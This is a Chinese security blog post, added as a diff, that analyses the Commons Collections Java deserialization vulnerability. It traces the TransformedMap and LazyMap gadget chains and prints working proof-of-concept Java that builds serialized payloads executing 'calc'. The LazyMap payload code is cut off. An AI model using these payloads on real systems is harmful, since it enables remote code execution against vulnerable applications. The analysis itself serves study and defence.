@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="(一)    Commons Collections漏洞简介2015年11月6日，FoxGlove Security安全团队的@breenmachine 发布的一篇博客[1]介绍了如何利用Java反序列化漏洞，来攻击WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些Java应用，实现远程代码执行。【影响到WebLogic的反序列化漏洞定为CVE-2015-4852">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Commons Collections JAVA反序列化漏洞分析">
+<meta property="og:url" content="http://yoursite.com/2019/08/20/Commons-Collections-JAVA-Unserialize/index.html">
+<meta property="og:site_name" content="pplsec">
+<meta property="og:description" content="(一)    Commons Collections漏洞简介2015年11月6日，FoxGlove Security安全团队的@breenmachine 发布的一篇博客[1]介绍了如何利用Java反序列化漏洞，来攻击WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些Java应用，实现远程代码执行。【影响到WebLogic的反序列化漏洞定为CVE-2015-4852">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/images/Commons-Collections-JAVA-Unserialize-21.png">
+<meta property="og:image" content="http://yoursite.com/images/Commons-Collections-JAVA-Unserialize-22.png">
+<meta property="og:image" content="http://yoursite.com/images/Commons-Collections-JAVA-Unserialize-23.png">
+<meta property="og:image" content="http://yoursite.com/images/Commons-Collections-JAVA-Unserialize-31.png">
+<meta property="og:image" content="http://yoursite.com/images/Commons-Collections-JAVA-Unserialize-41.png">
+<meta property="og:image" content="http://yoursite.com/images/Commons-Collections-JAVA-Unserialize-42.png">
+<meta property="og:image" content="http://yoursite.com/images/Commons-Collections-JAVA-Unserialize-43.png">
+<meta property="og:image" content="http://yoursite.com/images/Commons-Collections-JAVA-Unserialize-44.png">
+<meta property="og:image" content="http://yoursite.com/images/Commons-Collections-JAVA-Unserialize-45.png">
+<meta property="og:image" content="http://yoursite.com/images/Commons-Collections-JAVA-Unserialize-46.png">
+<meta property="og:image" content="http://yoursite.com/images/Commons-Collections-JAVA-Unserialize-47.png">
+<meta property="og:image" content="http://yoursite.com/images/Commons-Collections-JAVA-Unserialize-51.png">
+<meta property="og:image" content="http://yoursite.com/images/Commons-Collections-JAVA-Unserialize-52.png">
+<meta property="og:image" content="http://yoursite.com/images/Commons-Collections-JAVA-Unserialize-53.png">
+<meta property="og:image" content="http://yoursite.com/images/Commons-Collections-JAVA-Unserialize-54.png">
+<meta property="og:image" content="http://yoursite.com/images/Commons-Collections-JAVA-Unserialize-55.png">
+<meta property="og:updated_time" content="2019-08-20T14:20:30.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Commons Collections JAVA反序列化漏洞分析">
+<meta name="twitter:description" content="(一)    Commons Collections漏洞简介2015年11月6日，FoxGlove Security安全团队的@breenmachine 发布的一篇博客[1]介绍了如何利用Java反序列化漏洞，来攻击WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些Java应用，实现远程代码执行。【影响到WebLogic的反序列化漏洞定为CVE-2015-4852">
+<meta name="twitter:image" content="http://yoursite.com/images/Commons-Collections-JAVA-Unserialize-21.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/08/20/Commons-Collections-JAVA-Unserialize/">
+
+
+
+
+
+  <title>Commons Collections JAVA反序列化漏洞分析 | pplsec</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">pplsec</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">爱安全 爱生活</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/20/Commons-Collections-JAVA-Unserialize/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pplsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/ppl.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pplsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Commons Collections JAVA反序列化漏洞分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-20T22:20:30+08:00">
+                2019-08-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞分析/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞分析</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="一-Commons-Collections漏洞简介"><a href="#一-Commons-Collections漏洞简介" class="headerlink" title="(一)    Commons Collections漏洞简介"></a>(一)    Commons Collections漏洞简介</h3><p>2015年11月6日，FoxGlove Security安全团队的@breenmachine 发布的一篇博客[1]介绍了如何利用Java反序列化漏洞，来攻击WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些Java应用，实现远程代码执行。【影响到WebLogic的反序列化漏洞定为CVE-2015-4852】</p>
+<p>其实，博客作者并不是漏洞发现者。博客中提到，早在2015年的1月28号，Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上给出了一个报告[2]，报告中介绍了Java反序列化漏洞可以利用Apache Commons Collections这个常用的Java库来实现任意代码执行，当时并没有引起太大的关注，，可以说是2015年最被低估的漏洞。</p>
+<p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p>
+<p>该漏洞的出现的根源在Commons Collections组件中对于集合的操作存在可以进行反射调用的方法，并且该方法在相关对象反序列化时并未进行任何校验。</p>
+<h3 id="二-InvokerTransformer类的transform-方法"><a href="#二-InvokerTransformer类的transform-方法" class="headerlink" title="(二)    InvokerTransformer类的transform()方法"></a>(二)    InvokerTransformer类的transform()方法</h3><p>InvokerTransformer类的transform()方法是漏洞的根源，可以看到该该方法中采用了反射的方法进行函数调用,Input参数为要进行反射的对象,iMethodName,iParamTypes为调用的方法名称以及该方法的参数类型,iArgs为对应方法的参数</p>
+<p><img src="/images/Commons-Collections-JAVA-Unserialize-21.png" alt=""></p>
+<p>在invokeTransformer这个类的构造函数中可以发现,这三个参数均为可控参数<br><img src="/images/Commons-Collections-JAVA-Unserialize-22.png" alt=""></p>
+<p>InvokerTransformer是Transformer接口的实现类。<br>org.apache.commons.collections.Transformer接口上,可以看到该接口值定义了transform方法, 作用是给定一个Object对象经过转换后同时也返回一个Object<br><img src="/images/Commons-Collections-JAVA-Unserialize-23.png" alt=""></p>
+<h3 id="三-找谁调用InvokerTransformer的transform"><a href="#三-找谁调用InvokerTransformer的transform" class="headerlink" title="(三)    找谁调用InvokerTransformer的transform"></a>(三)    找谁调用InvokerTransformer的transform</h3><p>后面核心的问题就是寻找哪些类调用了Transformer接口中的transform方法。通过eclipse找到了以下类调用了该方法，有两个比较明显的类调用了transform方法，分别是TransformedMap 和 LazyMap<br>说明：ysoserial中的POC大多使用LazyMap来进行构造，其实这里TransformedMap构造触发更为简单,但是TransformedMap+ AnnotationInvocationHandler可能触发不成功，因为与jdk版本有关 jdk8u某些版本删除了memberValue.setValue()<br><img src="/images/Commons-Collections-JAVA-Unserialize-31.png" alt=""></p>
+<h3 id="四-TransformedMap分析"><a href="#四-TransformedMap分析" class="headerlink" title="(四)    TransformedMap分析"></a>(四)    TransformedMap分析</h3><h4 id="1-TransformedMap调用了transform"><a href="#1-TransformedMap调用了transform" class="headerlink" title="1)    TransformedMap调用了transform"></a>1)    TransformedMap调用了transform</h4><p>先分析下TransformedMap类，这个利用链比较简单<br>TransformedMap类checkSetValue(Object value)方法调用了transform()方法<br><img src="/images/Commons-Collections-JAVA-Unserialize-41.png" alt=""></p>
+<p>跟踪下valueTransformer这个变量，看看该变量是在哪被初始化的。看到这里的decorate方法会对valueTransformer进行初始化，同时实例化一个TransformedMap<br><img src="/images/Commons-Collections-JAVA-Unserialize-42.png" alt=""><br><img src="/images/Commons-Collections-JAVA-Unserialize-43.png" alt=""></p>
+<p>继续看谁调用了checkSetValue(Object value)   ，找到setValue(Object value)方法<br>在MapEntry类中的setValue()恰好调用了checkSetValue,这里直接触发了tranform函数<br><img src="/images/Commons-Collections-JAVA-Unserialize-44.png" alt=""></p>
+<p>为了能成功调用transform方法,找到了TransformedMap方法,发现在checkSetValue(Object value)方法中调用了该方法, 最终在MapEntry类中的setValue恰好调用了checkSetValue,最终触发了tranform函数。</p>
+<h4 id="2-利用反射本地执行命令POC"><a href="#2-利用反射本地执行命令POC" class="headerlink" title="2)    利用反射本地执行命令POC"></a>2)    利用反射本地执行命令POC</h4><p>上面分析完调用关系，那么后面要想任意代码执行，就可以首先构造一个Map和一个能够执行代码的ChainedTransformer，以此生成一个TransformedMap，然后去触发的MapEntry的 setValue()方法，即可触发我们构造的Transformer。<br>说明：这里的ChainedTransformer为链式的Transformer,会挨个执行我们定义的Transformer</p>
+<h5 id="TransformTest2-java"><a href="#TransformTest2-java" class="headerlink" title="TransformTest2.java"></a>TransformTest2.java</h5><p>测试代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">package lltest;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import java.util.Map.Entry;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">public class TransformTest2 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">            new ConstantTransformer(Runtime.class),</span><br><span class="line">            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                    new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, </span><br><span class="line">                    new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, </span><br><span class="line">                    new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chain = new ChainedTransformer(transformers) ;</span><br><span class="line">        Map innerMap = new HashMap() ;</span><br><span class="line">        //key和value的值可以为任意值</span><br><span class="line">        innerMap.put(&quot;name&quot;, &quot;hello&quot;) ;</span><br><span class="line">        //outerMap类型为TransformedMap</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, chain) ;</span><br><span class="line">       //获取当前Map.Entry的key和value值</span><br><span class="line">        Map.Entry elEntry = (Entry) outerMap.entrySet().iterator().next() ;   </span><br><span class="line">        //entry类型TransformedMap的父类AbstractInputCheckedMapDecorator</span><br><span class="line">        elEntry.setValue(&quot;lltest&quot;) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/Commons-Collections-JAVA-Unserialize-45.png" alt=""></p>
+<p>现在已经可以本地执行命令，后面就要远程命令执行（利用反序列化）<br>所以后面漏洞利用的核心条件就是去寻找一个类,在对象进行反序列化时会调用我们构造的MapEntry类的setValue(Object value)方法</p>
+<h4 id="3-找readObject-中调用MapEntry类的setValue-方法"><a href="#3-找readObject-中调用MapEntry类的setValue-方法" class="headerlink" title="3)    找readObject()中调用MapEntry类的setValue()方法"></a>3)    找readObject()中调用MapEntry类的setValue()方法</h4><p>如果Java应用没有对传入的序列化数据进行安全性检查，可以将恶意的TransformedMap序列化后，远程提交给Java应用，如果Java应用可以触发变换，即可成功远程命令执行。结合前述Commons Collections的特性，如果某个可序列化的类重写了readObject()方法，并且在readObject()中调用MapEntry类的setValue()方法，并且这个Map变量是可控的，就可以远程命令执行。于是找到了这个类：AnnotationInvocationHandler</p>
+<p>现在转移到sun.reflect.annotation.AnnotationInvocationHandler类上,看在该类进行反序列化时是如何触发漏洞代码的。</p>
+<p>跟进sun.reflect.annotation.AnnotationInvocationHandler的源代码<br><a href="https://github.com/frohoff/jdk8u-jdk/blob/master/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java" target="_blank" rel="noopener">https://github.com/frohoff/jdk8u-jdk/blob/master/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java</a><br><img src="/images/Commons-Collections-JAVA-Unserialize-46.png" alt=""></p>
+<p>这里的成员变量memberValues是Map类型,是我们通过构造AnnotationInvocationHandler 构造函数初始化的变量，也就是我们构造的TransformedMap对象。同时AnnotationInvocationHandler中重写的readObject()方法中恰好有memberValue.setValue()的操作，恰好触发漏洞。<br>那么就可以实例化一个AnnotationInvocationHandler类，将其成员变量memberValues赋值为含有payload的TransformedMap对象。然后将其序列化，提交给未做安全检测的Java应用。Java应用在AnnotationInvocationHandler.readObject(xx)反序列化时，则会触发TransformedMap的变换函数，执行命令。另外需要注意的是，想要在调用未包含的package中的构造函数，必须通过反射的方式。<br>所以这里POC执行流程为<br>TransformedMap-&gt;AnnotationInvocationHandler.readObject()-&gt;setValue()-&gt;checkSetValue()漏洞成功触发。</p>
+<h4 id="4-结合反序列化实现远程命令执行POC"><a href="#4-结合反序列化实现远程命令执行POC" class="headerlink" title="4)    结合反序列化实现远程命令执行POC"></a>4)    结合反序列化实现远程命令执行POC</h4><h5 id="DeserializePayload1-java-TransformedMap"><a href="#DeserializePayload1-java-TransformedMap" class="headerlink" title="DeserializePayload1.java(TransformedMap)"></a>DeserializePayload1.java(TransformedMap)</h5><p>利用TransformedMap来构造POC或者使用ysoserial生成POC</p>
+<p>正常利用，如同ysoserial生成payload 然后burp加载payload即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">package lltest;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">//https://joychou.org/java/commons-collections-java-deserialize-vulnerability-analysis.html</span><br><span class="line">//https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/</span><br><span class="line">public class DeserializePayload1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innermap = new HashMap();</span><br><span class="line"></span><br><span class="line">        // key的值只能为value，value的值可以为任意值</span><br><span class="line">        innermap.put(&quot;value&quot;, &quot;lltest&quot;);</span><br><span class="line"></span><br><span class="line">        // outerMap类型为TransformedMap</span><br><span class="line">        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">        // 调用未包含package中的构造函数，必须通过反射方式</span><br><span class="line">        Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        Object instance = ctor.newInstance(Retention.class, outmap);</span><br><span class="line">       </span><br><span class="line">        //序列化生成payload</span><br><span class="line">        File f = new File(&quot;tmp/payload1.ser&quot;);</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">        System.out.println(&quot;生成payload 位于tmp/payload1.ser&quot;);</span><br><span class="line">        </span><br><span class="line">       //模拟反序列化payload  触发漏洞 </span><br><span class="line">        ObjectInputStream in = new ObjectInputStream(new FileInputStream(&quot;tmp/payload1.ser&quot;));</span><br><span class="line">        in.readObject();  // 触发漏洞</span><br><span class="line">        in.close();</span><br><span class="line">        System.out.println(&quot;反序列化tmp/payload1.ser 触发漏洞&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>说明：测试时能否触发成功，是与jdk版本有关<br>采用AnnotationInvocationHandler类也是有限制的，能否成功利用与JDK的版本有关,<br>jdk8u中AnnotationInvocationHandler类删除了memberValue.setValue()，所以不能用AnnotationInvocationHandler+TransformedMap来构造反射链。<br><a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d" target="_blank" rel="noopener">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d</a><br><img src="/images/Commons-Collections-JAVA-Unserialize-47.png" alt=""></p>
+<h3 id="五-LazyMap分析"><a href="#五-LazyMap分析" class="headerlink" title="(五)    LazyMap分析"></a>(五)    LazyMap分析</h3><h4 id="1-LazyMap方法调用了transform方法"><a href="#1-LazyMap方法调用了transform方法" class="headerlink" title="1)    LazyMap方法调用了transform方法"></a>1)    LazyMap方法调用了transform方法</h4><p>分析下LazyMap类，ysoserial中的POC大多使用LazyMap来进行构造，该方式的POC成功率更高。</p>
+<p>LazyMap类get(Object key)方法调用了transform()方法<br><img src="/images/Commons-Collections-JAVA-Unserialize-51.png" alt=""></p>
+<p>续跟踪facory这个变量看该变量是在哪被初始化的<br>可看到这里的decorate方法会对factory进行初始化,同时实例化一个LazyMap,<br><img src="/images/Commons-Collections-JAVA-Unserialize-52.png" alt=""></p>
+<h4 id="2-找readObject-中调用LazyMap的get-方法"><a href="#2-找readObject-中调用LazyMap的get-方法" class="headerlink" title="2)    找readObject()中调用LazyMap的get()方法"></a>2)    找readObject()中调用LazyMap的get()方法</h4><p>为了能成功调用transform方法,找到了LazyMap方法,发现在get()方法中调用了该方法,所以说后面漏洞利用的核心条件就是去寻找一个类,在对象进行反序列化时会调用我们构造的get(Object)方法</p>
+<p>现在转移到sun.reflect.annotation.AnnotationInvocationHandler类上,看在该类进行反序列化时是如何触发漏洞代码的。</p>
+<p>跟进sun.reflect.annotation.AnnotationInvocationHandler的源代码<br><a href="https://github.com/frohoff/jdk8u-jdk/blob/master/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java" target="_blank" rel="noopener">https://github.com/frohoff/jdk8u-jdk/blob/master/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java</a><br><img src="/images/Commons-Collections-JAVA-Unserialize-53.png" alt=""></p>
+<p>这里的memberValues是通过构造AnnotationInvocationHandler 构造函数初始化的变量,也就是我们构造的lazymap对象,这里我们只需要找到一个memberValues.get(Object)的方法即可触发该漏洞,但是可惜的是该方法里面并没有这个方法。</p>
+<p>在readObject方法中并未找到lazymap的get方法,但在sun.reflect.annotation.AnnotationInvocationHandler类里面找看看那个方法调用了memberValues.get(Object)方法,很幸运发现在invoke方法中memberValues.get(Object)被调用<br><img src="/images/Commons-Collections-JAVA-Unserialize-54.png" alt=""></p>
+<p>AnnotationInvocationHandler默认实现了InvocationHandler接口,在用Object iswin=Proxy.newInstance(classloader,interface,InvocationHandler)生成动态代理后,当对象iswin在进行对象调用时,那么就会调用InvocationHandler.invoke(xx)方法,所以POC的执行流程为map.xx-&gt;proxy(Map).invoke-&gt;lazymap.get(xx) 就会触发transform方法从而执行恶意代码</p>
+<h4 id="3-结合反序列化实现远程命令执行POC"><a href="#3-结合反序列化实现远程命令执行POC" class="headerlink" title="3)    结合反序列化实现远程命令执行POC"></a>3)    结合反序列化实现远程命令执行POC</h4><h5 id="DeserializePayload2-java-LazyMap"><a href="#DeserializePayload2-java-LazyMap" class="headerlink" title="DeserializePayload2.java (LazyMap)"></a>DeserializePayload2.java (LazyMap)</h5><p>代码参考ysoserial的CommonsCollections5的payload<br>正常利用，如同ysoserial生成payload 然后burp加载payload即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">package lltest;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span 